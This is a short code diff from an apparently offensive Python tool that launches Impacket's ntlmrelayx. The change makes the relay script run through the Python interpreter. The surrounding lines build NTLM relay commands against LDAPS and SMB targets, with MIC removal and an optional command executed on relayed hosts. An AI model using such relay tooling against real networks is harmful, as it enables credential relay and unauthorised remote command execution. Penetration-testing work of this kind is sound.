@@ -801,7 +801,7 @@ def start_ntlmrelayx(target, custom_command=None, socks=False, smb_signing=False
         log("SMB", "ok", f"Using relay binary: {relay_bin}")
 
         cmd = [
-            relay_bin, "-t", ldaps_target,
+            sys.executable, relay_bin, "-t", ldaps_target,
             "--no-multirelay", "-i", "-smb2support",
             "--remove-mic", "--keep-relaying"
         ]
@@ -845,7 +845,8 @@ def start_ntlmrelayx(target, custom_command=None, socks=False, smb_signing=False
             sys.exit(1)
         log("SMB", "ok", f"Using relay binary: {relay_bin}")
 
-        cmd = [relay_bin, "-t", target, "-smb2support"]
+        # cmd = [relay_bin, "-t", target, "-smb2support"]
+        cmd = [sys.executable, relay_bin, "-t", target, "-smb2support"]
         if custom_command:
             cmd.extend(["-c", custom_command])
             log("RELAY", "..", f"Custom command on relay: {custom_command}")
